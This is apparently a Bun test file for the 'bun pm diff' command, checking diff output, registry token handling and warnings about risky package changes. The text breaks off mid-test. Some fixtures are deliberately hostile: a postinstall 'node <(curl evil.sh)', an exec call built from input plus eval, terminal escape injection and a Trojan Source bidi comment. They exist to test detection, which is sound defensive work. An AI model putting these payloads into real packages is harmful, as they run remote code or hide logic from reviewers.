import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { bunEnv, bunExe, normalizeBunSnapshot, tempDir } from "harness";
import { chmodSync, readdirSync, symlinkSync } from "node:fs";
import { join } from "node:path";

// Two versions of one small package, packed with `bun pm pack` and served from a
// local registry, so every mode of `bun pm diff` runs offline.
const v1 = {
  "package.json": JSON.stringify({ name: "diffme", version: "1.0.0", main: "index.js", scripts: { test: "echo ok" } }),
  "index.js": "module.exports = function () {\n  return 1;\n};\n",
  "README.md": "# diffme\n\nline a\nline b\nline c\nline d\nline e\nline f\nline g\nline h\n",
  "gone.txt": "only in v1\n",
};
const v2 = {
  "package.json": JSON.stringify({
    name: "diffme",
    version: "2.0.0",
    main: "dist/index.js",
    scripts: { test: "echo ok", postinstall: "node setup.js" },
    dependencies: { "left-pad": "^1.3.0" },
  }),
  "index.js": "module.exports = function () {\n  return 2;\n};\n",
  "README.md": "# diffme\n\nline a\nline b\nline c\nline d changed\nline e\nline f\nline g\nline h\n",
  "setup.js": "console.log('hi')\n",
  "logo.bin": Buffer.from([0, 1, 2, 3, 0, 255]),
};

let server: ReturnType<typeof Bun.serve>;
let registry: string;
let root: ReturnType<typeof tempDir>;
let tarballs: Record<string, string> = {};

// Packs `dir` into `dest` (outside the folder, so folder-side diffs do not see a stray tarball).
async function pack(dir: string, dest: string) {
  await using p = Bun.spawn({
    cmd: [bunExe(), "pm", "pack", "--quiet", "--destination", dest],
    cwd: dir,
    env: bunEnv,
    stdout: "pipe",
    stderr: "pipe",
  });
  const [, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
  const tgz = readdirSync(dest).find(f => f.endsWith(".tgz"));
  if (exitCode !== 0 || !tgz) throw new Error("pack failed: " + stderr);
  return join(dest, tgz);
}

beforeAll(async () => {
  root = tempDir("pm-diff", {
    "v1": v1,
    "v2": v2,
    "tgz1/.keep": "",
    "tgz2/.keep": "",
    "proj/package.json": JSON.stringify({ name: "proj", dependencies: { diffme: "1.0.0" } }),
  });
  tarballs["1.0.0"] = await pack(join(String(root), "v1"), join(String(root), "tgz1"));
  tarballs["2.0.0"] = await pack(join(String(root), "v2"), join(String(root), "tgz2"));
  server = Bun.serve({
    port: 0,
    async fetch(req) {
      const url = new URL(req.url);
      if (url.pathname === "/diffme") {
        const versions: any = {};
        for (const v of ["1.0.0", "2.0.0"]) {
          versions[v] = { name: "diffme", version: v, dist: { tarball: `${registry}/diffme/-/diffme-${v}.tgz` } };
        }
        return Response.json({
          name: "diffme",
          "dist-tags": { latest: "2.0.0", next: "2.0.0", legacy: "1.0.0" },
          versions,
        });
      }
      const m = url.pathname.match(/^\/diffme\/-\/diffme-(.+)\.tgz$/);
      if (m && tarballs[m[1]]) return new Response(Bun.file(tarballs[m[1]]));
      return new Response("Not Found", { status: 404 });
    },
  });
  registry = server.url.origin;
});
afterAll(() => {
  server?.stop(true);
  root?.[Symbol.dispose]();
});

async function diff(args: string[], cwd = String(root)) {
  await using p = Bun.spawn({
    cmd: [bunExe(), "pm", "diff", ...args],
    cwd,
    env: { ...bunEnv, NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry, NO_COLOR: "1" },
    stdout: "pipe",
    stderr: "pipe",
  });
  const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
  return { stdout, stderr, exitCode };
}

describe("bun pm diff", () => {
  test("two registry versions: summary, notable package.json changes, unified hunks", async () => {
    const { stdout, stderr, exitCode } = await diff(["diffme@1.0.0", "diffme@2.0.0"]);
    expect(stderr).toBe("");
    expect(normalizeBunSnapshot(stdout, root)).toMatchInlineSnapshot(`
"diffme@1.0.0 → diffme@2.0.0

diff --bun a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -3,7 +3,7 @@
 line a
 line b
 line c
-line d
+line d changed
 line e
 line f
 line g
diff --bun a/gone.txt b/gone.txt
deleted file
--- a/gone.txt
+++ /dev/null
@@ -1,1 +0,0 @@
-only in v1
diff --bun a/index.js b/index.js
--- a/index.js
+++ b/index.js
@@ -1,3 +1,3 @@
 module.exports = function () {
-  return 1;
+  return 2;
 };
diff --bun a/logo.bin b/logo.bin
new file
Binary files differ (0 → 6 bytes)
diff --bun a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,8 +1,12 @@
 {
   "name": "diffme",
-  "version": "1.0.0",
-  "main": "index.js",
+  "version": "2.0.0",
+  "main": "dist/index.js",
   "scripts": {
-    "test": "echo ok"
+    "test": "echo ok",
+    "postinstall": "node setup.js"
+  },
+  "dependencies": {
+    "left-pad": "^1.3.0"
   }
 }
/ No newline at end of file
diff --bun a/setup.js b/setup.js
new file
--- /dev/null
+++ b/setup.js
@@ -0,0 +1,1 @@
+console.log('hi')

diffme@1.0.0 → diffme@2.0.0
3 files changed, 2 added, 1 removed  (+10 -6 lines)
  ! postinstall script added: node setup.js
  ! dependencies added: left-pad@^1.3.0
  ! main changed: index.js → dist/index.js
  ! new binary file logo.bin (6 bytes)"
`);
    expect(exitCode).toBe(0);
  });

  test("name@a..b and a bare second version mean the same thing", async () => {
    const a = await diff(["diffme@1.0.0", "diffme@2.0.0"]);
    const b = await diff(["diffme@1.0.0..2.0.0"]);
    const c = await diff(["diffme@1.0.0", "2.0.0"]);
    const d = await diff(["--diff=diffme@1.0.0", "--diff=diffme@2.0.0"]);
    expect(b.stdout).toBe(a.stdout);
    expect(c.stdout).toBe(a.stdout);
    expect(d.stdout).toBe(a.stdout);
  });

  test("--name-only and --stat", async () => {
    const names = await diff(["diffme@1.0.0", "2.0.0", "--name-only"]);
    expect(names.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual([
      "M README.md",
      "D gone.txt",
      "M index.js",
      "A logo.bin",
      "M package.json",
      "A setup.js",
    ]);
    const stat = await diff(["diffme@1.0.0", "2.0.0", "--stat"]);
    expect(stat.stdout).toContain(" README.md    |     2 +-");
    expect(stat.stdout).toContain(" logo.bin     | bin   0 → 6 bytes");
    expect(stat.stdout).not.toContain("@@");
  });

  test("-U changes the context around a hunk", async () => {
    const { stdout } = await diff(["diffme@1.0.0", "2.0.0", "-U", "1"]);
    expect(stdout).toContain("@@ -5,3 +5,3 @@\n line c\n-line d\n+line d changed\n line e\n");
  });

  test("one name: the version in this project's lockfile → latest", async () => {
    const proj = join(String(root), "proj");
    await using install = Bun.spawn({
      cmd: [bunExe(), "install"],
      cwd: proj,
      env: { ...bunEnv, NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, installErr, installExit] = await Promise.all([
      install.stdout.text(),
      install.stderr.text(),
      install.exited,
    ]);
    expect(installErr).not.toContain("error:");
    expect(installExit).toBe(0);
    const { stdout, exitCode } = await diff(["diffme", "--name-only"], proj);
    expect(stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(exitCode).toBe(0);
  });

  test("one folder: the registry side is named by that folder's package.json, not the project's", async () => {
    // From proj/ (name "proj") pointing at ../v1 (name "diffme"): must look up diffme@latest.
    const { stdout, exitCode } = await diff(["../v1", "--name-only"], join(String(root), "proj"));
    expect(stdout.split("\n")[0]).toBe("diffme@2.0.0 → ../v1");
    expect(exitCode).toBe(0);
  });

  test("a folder against a tarball, no registry involved", async () => {
    const { stdout, exitCode } = await diff(["./v1", tarballs["2.0.0"], "--name-only"]);
    expect(stdout.split("\n")[0]).toBe(`./v1 → ${tarballs["2.0.0"]}`);
    expect(stdout).toContain("A setup.js");
    expect(stdout).toContain("D gone.txt");
    expect(exitCode).toBe(0);
  });

  test("no arguments inside a package folder: what is published → this folder", async () => {
    const { stdout, exitCode } = await diff(["--name-only"], join(String(root), "v1"));
    const lines = stdout.split("\n");
    expect(lines[0]).toBe("diffme@2.0.0 → .");
    // 2.0.0 as published → v1 on disk: setup.js and logo.bin are gone from this side, gone.txt is back.
    expect(lines.filter(l => /^[AMD] /.test(l))).toEqual([
      "M README.md",
      "A gone.txt",
      "M index.js",
      "D logo.bin",
      "M package.json",
      "D setup.js",
    ]);
    expect(exitCode).toBe(0);
  });

  test("patch output marks a side that ends without a newline", async () => {
    using dir = tempDir("pm-diff-nonl", {
      "a/package.json": `{"name":"x","version":"1.0.0"}`,
      "b/package.json": `{"name":"x","version":"1.0.1"}\n`,
      "b/min.js": `let a=1`,
    });
    const { stdout, exitCode } = await diff(["./a", "./b"], String(dir));
    expect(stdout).toContain(
      '-{"name":"x","version":"1.0.0"}\n\\ No newline at end of file\n+{"name":"x","version":"1.0.1"}\n',
    );
    expect(stdout).toContain("+let a=1\n\\ No newline at end of file\n");
    expect(exitCode).toBe(0);
  });

  test("an unparseable -U is an error, not a silent default", async () => {
    const { stderr, exitCode } = await diff(["diffme@1.0.0", "2.0.0", "-U", "lots"]);
    expect(stderr).toContain("invalid --unified value");
    expect(exitCode).toBe(1);
  });

  test("on a terminal: per-file headers, a line-number gutter, no patch syntax", async () => {
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "diffme@1.0.0", "2.0.0"],
      cwd: String(root),
      env: {
        ...bunEnv,
        NPM_CONFIG_REGISTRY: registry,
        BUN_CONFIG_REGISTRY: registry,
        NO_COLOR: undefined,
        FORCE_COLOR: "1",
      },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(stderr).toBe("");
    expect(raw).toContain("\x1b[");
    const text = raw.replace(/\x1b\[[0-9;]*[mK]/g, "");
    expect(text).toContain("diffme 1.0.0 → 2.0.0\n");
    expect(text).toContain("6 files  +10 -6  ·  2 new  ·  1 deleted\n");
    expect(text).toMatch(/\nREADME\.md ─+ \+1 -1\n/);
    expect(text).toMatch(/\ngone\.txt ─+ deleted -1\n/);
    expect(text).toMatch(/\nlogo\.bin ─+ binary 0 → 6 bytes\n/);
    expect(text).toContain("    5 │  line c\n    6 │- line d\n    6 │+ line d changed\n    7 │  line e\n");
    expect(text).not.toContain("@@");
    expect(text).not.toContain("+++");
    expect(exitCode).toBe(0);
  });

  test("identical sides say so", async () => {
    const { stdout, exitCode } = await diff(["diffme@2.0.0", "2.0.0"]);
    expect(stdout).toBe("diffme@2.0.0 → diffme@2.0.0\nNo differences (5 files)\n");
    expect(exitCode).toBe(0);
  });

  test("--json: one document with labels, per-file status/counts/patch, plain-text notes and totals", async () => {
    const { stdout, exitCode } = await diff(["diffme@1.0.0", "2.0.0", "--json"]);
    const j = JSON.parse(stdout);
    expect(j.from).toBe("diffme@1.0.0");
    expect(j.to).toBe("diffme@2.0.0");
    expect(j.files.map((f: any) => [f.path, f.status, f.linesAdded, f.linesRemoved])).toEqual([
      ["README.md", "modified", 1, 1],
      ["gone.txt", "deleted", 0, 1],
      ["index.js", "modified", 1, 1],
      ["logo.bin", "added", 0, 0],
      ["package.json", "modified", 7, 3],
      ["setup.js", "added", 1, 0],
    ]);
    expect(j.files.find((f: any) => f.path === "index.js").patch).toBe(
      "@@ -1,3 +1,3 @@\n module.exports = function () {\n-  return 1;\n+  return 2;\n };\n",
    );
    expect(j.files.find((f: any) => f.path === "logo.bin")).toMatchObject({ binary: true, bytesAfter: 6 });
    expect(j.notes).toEqual([
      "postinstall script added: node setup.js",
      "dependencies added: left-pad@^1.3.0",
      "main changed: index.js → dist/index.js",
      "new binary file logo.bin (6 bytes)",
    ]);
    expect(j.totals).toEqual({ files: 6, added: 2, deleted: 1, linesAdded: 10, linesRemoved: 6, formattingOnly: 0 });
    expect(exitCode).toBe(0);
  });

  test("the registry token is sent to the registry, never to a foreign dist.tarball host", async () => {
    // Registry A demands a bearer token and points 2.0.0's tarball at host B; B must not see the token.
    const seen = { a: [] as (string | null)[], b: [] as (string | null)[] };
    using foreign = Bun.serve({
      port: 0,
      fetch(req) {
        seen.b.push(req.headers.get("authorization"));
        return new Response(Bun.file(tarballs["2.0.0"]));
      },
    });
    using authed = Bun.serve({
      port: 0,
      fetch(req) {
        seen.a.push(req.headers.get("authorization"));
        if (req.headers.get("authorization") !== "Bearer sekrit") return new Response("no", { status: 401 });
        const url = new URL(req.url);
        if (url.pathname === "/diffme") {
          return Response.json({
            name: "diffme",
            "dist-tags": { latest: "2.0.0" },
            versions: {
              "1.0.0": {
                name: "diffme",
                version: "1.0.0",
                dist: { tarball: `${authed.url.origin}/diffme/-/diffme-1.0.0.tgz` },
              },
              "2.0.0": {
                name: "diffme",
                version: "2.0.0",
                dist: { tarball: `${foreign.url.origin}/stolen/diffme-2.0.0.tgz` },
              },
            },
          });
        }
        return new Response(Bun.file(tarballs["1.0.0"]));
      },
    });
    using dir = tempDir("pm-diff-auth", {
      "bunfig.toml": `[install]\nregistry = { url = "${authed.url.origin}/", token = "sekrit" }\n`,
    });
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "diffme@1.0.0", "2.0.0", "--name-only"],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: "1" },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(stderr).toBe("");
    expect(stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    expect(seen.a.every(h => h === "Bearer sekrit")).toBe(true);
    expect(seen.a.length).toBeGreaterThanOrEqual(2);
    expect(seen.b).toEqual([null]);
    expect(exitCode).toBe(0);
  });

  test("dist-tags, ranges and open-ended a.. spellings resolve like install would", async () => {
    // (a bare second word is only reused as a version when it is one; `next` alone would be the package "next")
    const tag = await diff(["diffme@legacy", "diffme@next", "--name-only"]);
    expect(tag.stderr).toBe("");
    expect(tag.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    const range = await diff(["diffme@^1", "diffme@>=2 <3", "--name-only"]);
    expect(range.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    const openEnded = await diff(["diffme@1.0.0..", "--name-only"]);
    expect(openEnded.stdout.split("\n")[0]).toBe("diffme@1.0.0 → diffme@2.0.0");
    for (const r of [tag, range, openEnded]) expect(r.exitCode).toBe(0);
  });

  test("scoped packages use their scope's registry and token", async () => {
    // The default registry knows nothing about @priv/*; only the scope registry (with its own token) does.
    const hits: string[] = [];
    using scoped = Bun.serve({
      port: 0,
      fetch(req) {
        const url = new URL(req.url);
        hits.push(`${req.headers.get("authorization")} ${decodeURIComponent(url.pathname)}`);
        if (req.headers.get("authorization") !== "Bearer scopetok") return new Response("no", { status: 401 });
        if (decodeURIComponent(url.pathname) === "/@priv/diffme") {
          const versions: any = {};
          for (const v of ["1.0.0", "2.0.0"]) {
            versions[v] = {
              name: "@priv/diffme",
              version: v,
              dist: { tarball: `${scoped.url.origin}/@priv/diffme/-/diffme-${v}.tgz` },
            };
          }
          return Response.json({ name: "@priv/diffme", "dist-tags": { latest: "2.0.0" }, versions });
        }
        const m = url.pathname.match(/diffme-(.+)\.tgz$/);
        return m ? new Response(Bun.file(tarballs[m[1]])) : new Response("Not Found", { status: 404 });
      },
    });
    using dir = tempDir("pm-diff-scope", {
      "bunfig.toml": `[install.scopes]\n"@priv" = { url = "${scoped.url.origin}/", token = "scopetok" }\n`,
    });
    for (const args of [
      ["@priv/diffme@1.0.0", "2.0.0"],
      ["@priv/diffme@1.0.0..2.0.0"],
      ["@priv/diffme@1.0.0", "@priv/diffme@2.0.0"],
    ]) {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
        cwd: String(dir),
        env: { ...bunEnv, NO_COLOR: "1", NPM_CONFIG_REGISTRY: registry, BUN_CONFIG_REGISTRY: registry },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      expect(stderr).toBe("");
      expect(stdout.split("\n")[0]).toBe("@priv/diffme@1.0.0 → @priv/diffme@2.0.0");
      expect(exitCode).toBe(0);
    }
    expect(hits.every(h => h.startsWith("Bearer scopetok "))).toBe(true);
    expect(hits.some(h => h.endsWith(" /@priv/diffme"))).toBe(true);
  });

  test("errors: unknown package, no matching version, too many specs", async () => {
    const unknown = await diff(["nope-nope@1.0.0", "2.0.0"]);
    expect(unknown.exitCode).toBe(1);
    expect(unknown.stderr).toContain("404");
    const nover = await diff(["diffme@9.9.9", "2.0.0"]);
    expect(nover.exitCode).toBe(1);
    expect(nover.stderr).toContain("no version of diffme matches 9.9.9");
    const many = await diff(["diffme@1", "diffme@2", "diffme@3"]);
    expect(many.exitCode).toBe(1);
  });
});

// The terminal view re-prints JS/CSS/JSON through Bun's parser and printer before diffing, so only changes in
// meaning survive. These run folder-against-folder; no registry involved.
describe.concurrent("bun pm diff (canonical re-print)", () => {
  async function pretty(files: Record<string, string | Record<string, string>>, args: string[] = []) {
    using dir = tempDir("pm-diff-ast", files);
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b", ...args],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120" },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    return { text: raw.replace(/\x1b\[[0-9;]*[mK]/g, ""), stderr, exitCode };
  }
  const changedLines = (text: string) => text.split("\n").filter(l => /^ +\d+ │[-+] /.test(l));

  test("a reformat-only release collapses to 'formatting only'", async () => {
    const { text, exitCode } = await pretty({
      "a/package.json": `{"name":"x","version":"1.0.0"}`,
      "b/package.json": `{\n  "name": "x",\n  "version": "1.0.0"\n}\n`,
      "a/index.js": `'use strict';\nmodule.exports = function add(a, b) { return a + b; };\n`,
      "b/index.js": `"use strict"\n\nmodule.exports = function add(a, b) {\n\treturn a + b\n}\n`,
      "a/style.css": `.a{color:red;margin:0 auto}`,
      "b/style.css": `.a {\n  color: red;\n  margin: 0 auto;\n}\n`,
    });
    expect(text).toMatch(/\nindex\.js ─+ formatting only\n/);
    expect(text).toMatch(/\npackage\.json ─+ formatting only\n/);
    expect(text).toMatch(/\nstyle\.css ─+ formatting only\n/);
    expect(text).toContain("3 formatting only");
    expect(changedLines(text)).toEqual([]);
    expect(exitCode).toBe(0);
  });

  test("two minified builds with different mangled names diff down to the real change", async () => {
    // Same program, names handed out differently by the "minifier", plus one genuine edit (* 2 → * 3) and one
    // inserted helper in b. Long enough on one line to count as minified.
    const body = (n: Record<string, string>, mul: string, extra = "") =>
      `!function(){${extra}function ${n.add}(${n.x},${n.y}){return ${n.x}+${n.y}}function ${n.inc}(${n.x}){return ${n.add}(${n.x},1)*${mul}}` +
      `function ${n.pad1}(${n.x}){return String(${n.x}).padStart(8," ")}function ${n.pad2}(${n.x}){return String(${n.x}).padEnd(8," ")}` +
      `function ${n.clamp}(${n.x},${n.y},${n.z}){return ${n.x}<${n.y}?${n.y}:${n.x}>${n.z}?${n.z}:${n.x}}` +
      `function ${n.sum}(${n.x}){for(var ${n.y}=0,${n.z}=0;${n.z}<${n.x}.length;${n.z}++)${n.y}+=${n.x}[${n.z}];return ${n.y}}` +
      `module.exports={add:${n.add},inc:${n.inc},padStart:${n.pad1},padEnd:${n.pad2},clamp:${n.clamp},sum:${n.sum}}}();\n`;
    const v1 = body({ add: "a", inc: "b", pad1: "c", pad2: "d", clamp: "e", sum: "f", x: "n", y: "t", z: "r" }, "2");
    const v2 = body(
      { add: "t", inc: "n", pad1: "r", pad2: "e", clamp: "u", sum: "o", x: "a", y: "b", z: "c" },
      "3",
      `function i(a){return a==null}`,
    );
    expect(v1.length).toBeGreaterThan(256);
    const { text, exitCode } = await pretty({ "a/dist/x.min.js": v1, "b/dist/x.min.js": v2 });
    expect(text).toMatch(/\ndist\/x\.min\.js ─+ unminified \+4 -1\n/);
    const changed = changedLines(text).map(l => l.replace(/^ +\d+ │/, ""));
    expect(changed.filter(l => l.startsWith("-"))).toEqual(["-     return b(a1, 1) * 2;"]);
    expect(changed.filter(l => l.startsWith("+"))).toEqual([
      "+   function a(a1) {",
      "+     return a1 == null;",
      "+   }",
      "+     return b(a1, 1) * 3;",
    ]);
    // --raw turns all of that off: one giant line each way.
    expect(exitCode).toBe(0);
    const raw = await pretty({ "a/dist/x.min.js": v1, "b/dist/x.min.js": v2 }, ["--raw"]);
    expect(raw.text).toMatch(/\ndist\/x\.min\.js ─+ \+1 -1\n/);
    expect(raw.exitCode).toBe(0);
  });

  test("--minify folds equivalent syntax; --unminify renames locals in lockstep even in readable files; -w", async () => {
    const files = {
      // Same program, different spellings: only --minify sees through it.
      "a/flags.js": `module.exports = { on: !0, off: !1, none: void 0, s: 'x' + 'y' };\n`,
      "b/flags.js": `module.exports = { on: true, off: false, none: undefined, s: "xy" };\n`,
      // Same program, locals renamed by hand: only --unminify (or a minified-looking file) collapses it.
      "a/sum.js": `module.exports = function sum(xs) {\n  let t = 0;\n  for (const x of xs) t += x;\n  return t;\n};\n`,
      "b/sum.js": `module.exports = function sum(a) {\n  let n = 0;\n  for (const v of a) n += v;\n  return n;\n};\n`,
      "a/notes.txt": `one two\nthree\n`,
      "b/notes.txt": `one  two\n\tthree \n\n`,
    };
    const plain = await pretty(files);
    expect(plain.text).toMatch(/\nflags\.js ─+ normalized \+1 -1\n/);
    expect(plain.text).toMatch(/\nsum\.js ─+ normalized \+5 -5\n/);
    expect(plain.text).toMatch(/\nnotes\.txt ─+ \+3 -2\n/);
    const folded = await pretty(files, ["--minify", "--unminify", "-w"]);
    expect(folded.text).toMatch(/\nflags\.js ─+ formatting only\n/);
    expect(folded.text).toMatch(/\nsum\.js ─+ formatting only\n/);
    expect(folded.text).toMatch(/\nnotes\.txt ─+ whitespace only\n/);
    expect(folded.text).toContain("2 formatting only  ·  1 whitespace only");
    expect(changedLines(folded.text)).toEqual([]);
    expect(folded.exitCode).toBe(0);
    // --unformatted is --raw.
    const raw = await pretty(files, ["--unformatted"]);
    expect(raw.text).toMatch(/\nflags\.js ─+ \+1 -1\n/);
    // Piped, -w still yields a complete patch for the whitespace-only file.
    using dir = tempDir("pm-diff-w", files);
    const piped = await diff(["./a", "./b", "-w"], String(dir));
    expect(piped.stdout).toContain(
      "--- a/notes.txt\n+++ b/notes.txt\n@@ -1,2 +1,3 @@\n-one two\n-three\n+one  two\n+\tthree \n+\n",
    );
    expect(piped.exitCode).toBe(0);
  });

  test("CRLF files: the terminal view diffs them as LF, and a pure line-ending flip collapses", async () => {
    const { text, stderr, exitCode } = await pretty({
      "a/notes.txt": "same line\r\nold value here\r\n",
      "b/notes.txt": "same line\nnew value here\n",
      "a/eol.txt": "one\r\ntwo\r\n",
      "b/eol.txt": "one\ntwo\n",
      // A stray CR at end of file (no newline after it) on one side only.
      "a/bare.txt": "same\nfoo\r",
      "b/bare.txt": "same\nbar",
    });
    expect(stderr).toBe("");
    expect(text).toContain("    1 │  same line\n    2 │- old value here\n    2 │+ new value here\n");
    expect(text).toMatch(/\neol\.txt ─+ line endings only\n/);
    expect(text).toContain("    1 │  same\n    2 │- foo\n    2 │+ bar\n");
    expect(text).not.toContain("\r");
    expect(exitCode).toBe(0);
  });

  test("package.json text in the summary is shown literally, angle brackets and all", async () => {
    const { text } = await pretty({
      "a/package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { y: "^1.0.0" } }),
      "b/package.json": JSON.stringify({
        name: "x",
        version: "1.0.1",
        dependencies: { y: ">=1.3.0 <2" },
        scripts: { postinstall: "node <(curl evil.sh)" },
      }),
    });
    expect(text).toContain("▲ postinstall script added: node <(curl evil.sh)\n");
    expect(text).toContain("▲ dependencies y: ^1.0.0 → >=1.3.0 <2\n");
  });

  test("summary calls out new builtin imports, risky APIs, and skips source maps", async () => {
    const { text, exitCode } = await pretty({
      "a/index.js": `const path = require("path");\nmodule.exports = p => path.basename(p);\n`,
      "b/index.js":
        `const path = require("path");\nconst cp = require("child_process");\nconst leftPad = require("left-pad");\n` +
        `module.exports = p => { cp.exec("echo " + p); return eval(leftPad(path.basename(p))); };\n`,
      "a/index.js.map": `{"version":3,"mappings":"AAAA"}`,
      "b/index.js.map": `{"version":3,"mappings":"AACA;AAAA"}`,
    });
    expect(text).toContain("▲ now imports child_process (index.js)\n");
    expect(text).toContain("▲ new module imports: left-pad\n");
    expect(text).toContain("▲ +1 eval() (index.js)\n");
    expect(text).toMatch(/\nindex\.js\.map ─+ source map 31 → 36 bytes\n/);
    expect(exitCode).toBe(0);
  });
});

describe.concurrent("bun pm diff (hostile and awkward inputs)", () => {
  async function pretty(files: Record<string, any>, args: string[] = [], env: Record<string, string> = {}) {
    using dir = tempDir("pm-diff-hx", files);
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b", ...args],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120", ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    return { raw, text: raw.replace(/\x1b\[[0-9;]*[mK]/g, ""), stderr, exitCode, dir: String(dir) };
  }
  const ESC = "\x1b";
  const CSI_C1 = "\u009b";
  const RLO = "\u202e";
  const LRI = "\u2066";
  const PDI = "\u2069";

  test("package bytes never drive the terminal: ESC/CR/C1 and bidi controls are drawn, and called out", async () => {
    const evil = `exports.ok = true;\nexports.motd = "${ESC}[2K${ESC}[1A hidden \r";\nconst s = "${CSI_C1}31m"; // C1 CSI\n`;
    const trojan = `const isAdmin = false; /*${RLO} } ${LRI}if (isAdmin)${PDI} ${LRI} begin admins only */\n`;
    const { raw, text, exitCode } = await pretty({
      "a/index.js": "exports.ok = true;\n",
      "b/index.js": evil,
      "a/auth.js": "const isAdmin = false;\n",
      "b/auth.js": trojan,
    });
    // The only ESC bytes in the output are our own colour / erase-to-EOL codes.
    expect(raw.replace(/\x1b\[[0-9;]*[mK]/g, "")).not.toContain(ESC);
    expect(raw).not.toContain(CSI_C1);
    expect(raw).not.toContain(RLO);
    expect(text).toContain('exports.motd = "␛[2K␛[1A hidden ^M";');
    expect(text).toContain("‹U+009B›31m");
    expect(text).toContain("‹U+202E›");
    expect(text).toContain("▲ terminal escape sequences in index.js (shown as ␛)\n");
    expect(text).toContain("▲ bidirectional text controls in auth.js (Trojan Source; shown as ‹U+202E›)\n");
    expect(exitCode).toBe(0);
  });

  test("a comment-only change is not 'formatting only', and neither is a TypeScript type change", async () => {
    const { text, exitCode } = await pretty({
      // Ordinary comments are not in the re-print, so a change to one must not pass as formatting.
      "a/lib.js": "// lib v1 (MIT)\nmodule.exports = 1; // one\n",
      "b/lib.js": "// lib v2 (MIT)\nmodule.exports = 1; // uno\n",
      // Legal comments are kept by the printer, so they diff like code.
      "a/legal.js": "/*! lib v1 | MIT */\nmodule.exports = 1;\n",
      "b/legal.js": "/*! lib v2 | MIT */\nmodule.exports = 1;\n",
      "a/quotes.js": "module.exports = 'x'; // same\n",
      "b/quotes.js": 'module.exports = "x"; // same\n',
      "a/api.ts": "export function f(x: number): number { return x; }\n",
      "b/api.ts": "export function f(x: string): string { return x; }\n",
    });
    expect(text).toMatch(/\nlib\.js ─+ comments only \+2 -2\n/);
    expect(text).toContain("│- // lib v1 (MIT)");
    expect(text).toMatch(/\nlegal\.js ─+ normalized \+1 -1\n/);
    expect(text).toContain("│- /*! lib v1 | MIT */");
    expect(text).toMatch(/\nquotes\.js ─+ formatting only\n/);
    expect(text).toMatch(/\napi\.ts ─+ types\/formatting \+1 -1\n/);
    expect(text).toContain("│+ export function f(x: string): string { return x; }");
    expect(exitCode).toBe(0);
  });

  test("JSX inside .js still normalizes", async () => {
    const { text, exitCode } = await pretty({
      "a/App.js": "export const App = () => <div className='a'>hi</div>;\n",
      "b/App.js": 'export const App = () => (\n  <div className="a">hi</div>\n);\n',
    });
    expect(text).toMatch(/\nApp\.js ─+ formatting only\n/);
    expect(exitCode).toBe(0);
  });

  test.skipIf(process.platform === "win32")(
    "mode changes: newly executable files are shown and called out",
    async () => {
      using dir = tempDir("pm-diff-mode", {
        "a/run.sh": "#!/bin/sh\necho hi\n",
        "b/run.sh": "#!/bin/sh\necho hi\n",
        "b/install.js": "console.log(1)\n",
      });
        chmodSync(join(String(dir), "a/run.sh"), 0o644);
      chmodSync(join(String(dir), "b/run.sh"), 0o755);
      chmodSync(join(String(dir), "b/install.js"), 0o755);
      const run = async (env: Record<string, string | undefined>) => {
        await using p = Bun.spawn({
          cmd: [bunExe(), "pm", "diff", "./a", "./b"],
          cwd: String(dir),
          env: { ...bunEnv, ...env },
          stdout: "pipe",
          stderr: "pipe",
        });
        const [stdout, , exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
        return { stdout, exitCode };
      };
      const tty = await run({ NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120" });
      const text = tty.stdout.replace(/\x1b\[[0-9;]*[mK]/g, "");
      expect(text).toMatch(/\nrun\.sh ─+ mode 644 → 755\n/);
      expect(text).toMatch(/\ninstall\.js ─+ executable 755 new \+1\n/);
      expect(text).toContain("▲ now executable: run.sh (644 → 755)\n");
      expect(text).toContain("▲ new executable file install.js (755)\n");
      expect(tty.exitCode).toBe(0);
      // Patch mode spells it the way git does.
      const plain = await run({ NO_COLOR: "1" });
      expect(plain.stdout).toContain("diff --bun a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n");
      expect(plain.stdout).toContain("diff --bun a/install.js b/install.js\nnew file mode 100755\n");
      expect(plain.exitCode).toBe(0);
    },
  );

  test.skipIf(process.platform === "win32")(
    "folders: symlinked files are read through, symlinked folders skipped, unreadable files are an error",
    async () => {
